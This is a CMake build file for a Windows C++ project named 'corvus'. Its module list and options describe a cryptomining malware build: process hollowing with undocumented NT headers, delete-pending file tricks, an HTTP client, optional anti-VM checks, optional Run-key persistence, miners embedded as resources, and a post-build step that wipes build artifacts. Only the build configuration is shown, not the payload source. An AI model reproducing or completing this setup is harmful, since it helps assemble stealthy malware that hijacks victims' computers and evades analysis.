cmake_minimum_required(VERSION 3.10)
project(corvus)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

add_definitions(-DUNICODE -D_UNICODE)

# Optional Debug Console feature
option(ENABLE_DEBUG_CONSOLE "Enable debug console output" OFF)
if(ENABLE_DEBUG_CONSOLE)
    message(STATUS "Debug console enabled")
endif()

# Optional Anti-VM feature
option(ENABLE_ANTIVM "Enable Anti-VM detection" OFF)

# Optional Persistence feature
option(ENABLE_PERSISTENCE "Enable persistence via Run key" OFF)

# Source files
set(SRC_FILES
    src/main.cpp
    src/util.cpp
    src/pe_hdrs_helper.cpp
    src/hollowing_parts.cpp
    src/delete_pending_file.cpp
    src/http_client.cpp
    src/json_printer.cpp
    src/process_info.cpp
    src/config_manager.cpp
)

# Resource files
set(RESOURCE_FILES
    resources/embedded_resource.rc
)

# Header files
set(HEADER_FILES
    include/util.h
    include/kernel32_undoc.h
    include/ntddk.h
    include/pe_hdrs_helper.h
    include/hollowing_parts.h
    include/delete_pending_file.h
    include/http_client.h
    include/json_printer.h
    include/json.hpp
    include/process_info.h
    include/config_manager.h
)

# Add Anti-VM files if enabled
if(ENABLE_ANTIVM)
    message(STATUS "Anti-VM detection enabled")
    add_definitions(-DENABLE_ANTIVM)
    list(APPEND SRC_FILES src/antivm.cpp)
    list(APPEND HEADER_FILES include/antivm.h)
endif()

# Add Persistence files if enabled
if(ENABLE_PERSISTENCE)
    message(STATUS "Persistence enabled")
    add_definitions(-DENABLE_PERSISTENCE)
    list(APPEND SRC_FILES src/persistence.cpp)
    list(APPEND HEADER_FILES include/persistence.h)
endif()

# Miners are now embedded as resources in the executable
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
if(MSVC)
    # Enable resource compilation for MSVC
    enable_language(RC)
endif()
if(NOT MSVC)
	set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
endif()
set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")

# Create executable
add_executable(corvus 
    #WIN32 
    ${SRC_FILES}
    ${RESOURCE_FILES}
    ${HEADER_FILES}
)

# Set linker flags for GUI subsystem (hide console)
set_target_properties(corvus PROPERTIES
    OUTPUT_NAME corvus
)

target_compile_options(corvus PRIVATE -w)

# Link libraries
if(MSVC)
	target_link_libraries(corvus
		winhttp.lib
		ntdll.lib
		wbemuuid.lib
		ole32.lib
		oleaut32.lib
	)
else()
	target_link_libraries(corvus
		-lwinhttp
		-lntdll
		-lwbemuuid
		-lole32
		-loleaut32
	)
endif()

# Include directories
target_include_directories(corvus PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/include
)

# Installation
install(TARGETS corvus
    DESTINATION ${CMAKE_INSTALL_PREFIX}
    COMPONENT corvus
)

add_custom_command(TARGET corvus POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E remove_directory ${CMAKE_BINARY_DIR}/CMakeFiles
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/CMakeCache.txt
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/cmake_install.cmake
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/Makefile
    COMMENT "Auto-removing CMake-generated files"
)

message(STATUS "Project configured for build")